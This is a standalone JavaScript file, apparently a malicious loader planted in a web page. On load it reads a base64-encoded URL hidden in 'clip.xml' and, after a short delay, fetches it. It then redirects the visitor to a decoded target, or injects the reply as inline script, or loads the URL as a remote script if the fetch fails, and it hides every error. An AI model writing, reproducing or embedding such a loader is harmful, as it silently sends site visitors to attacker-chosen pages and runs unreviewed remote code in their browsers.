(function () {
  var WAIT_MS = 500;

  function parseHopBody(text) {
    var body = String(text || '').trim();
    try {
      var j = JSON.parse(body);
      if (j && j.c) {
        var u = atob(String(j.c).trim());
        if (/^https?:\/\//i.test(u)) return u;
      }
    } catch (e) {}
    var patterns = [
      /top\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
      /location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
      /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i
    ];
    for (var i = 0; i < patterns.length; i++) {
      var m = body.match(patterns[i]);
      if (m && m[1]) return m[1];
    }
    throw new Error('parse');
  }

  function hopFromXml(xmlText) {
    var doc = new DOMParser().parseFromString(xmlText, 'application/xml');
    if (doc.querySelector('parsererror')) throw new Error('xml');
    var node = doc.getElementsByTagName('href')[0];
    var url = atob(String(node && node.textContent || '').trim());
    if (!/^https?:\/\//i.test(url)) throw new Error('bad');
    return url;
  }

  function attachRemote(hopUrl) {
    var s = document.createElement('script');
    s.src = hopUrl;
    s.async = true;
    document.head.appendChild(s);
  }

  function runInline(body) {
    var s = document.createElement('script');
    s.text = body;
    document.head.appendChild(s);
  }

  function openHop(hopUrl) {
    var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
    var timer = null;
    if (ctrl) {
      timer = setTimeout(function () { ctrl.abort(); }, 4000);
    }
    fetch(hopUrl, {
      cache: 'no-store',
      credentials: 'omit',
      signal: ctrl ? ctrl.signal : undefined
    })
      .then(function (res) {
        if (!res.ok) throw new Error('http');
        return res.text();
      })
      .then(function (body) {
        try {
          window.location.replace(parseHopBody(body));
        } catch (e) {
          runInline(body);
        }
      })
      .catch(function () {
        attachRemote(hopUrl);
      })
      .then(function () {
        if (timer) clearTimeout(timer);
      });
  }

  function afterWait(fn) {
    var start = Date.now();
    function fire() {
      var left = WAIT_MS - (Date.now() - start);
      if (left > 16) setTimeout(fn, left);
      else fn();
    }
    if (typeof requestIdleCallback === 'function') {
      requestIdleCallback(fire, { timeout: WAIT_MS });
    } else {
      setTimeout(fn, WAIT_MS);
    }
  }

  fetch('clip.xml', { cache: 'no-store' })
    .then(function (res) {
      if (!res.ok) throw new Error('cfg');
      return res.text();
    })
    .then(function (xml) {
      var hopUrl = hopFromXml(xml);
      afterWait(function () { openHop(hopUrl); });
    })
    .catch(function () {});
})();
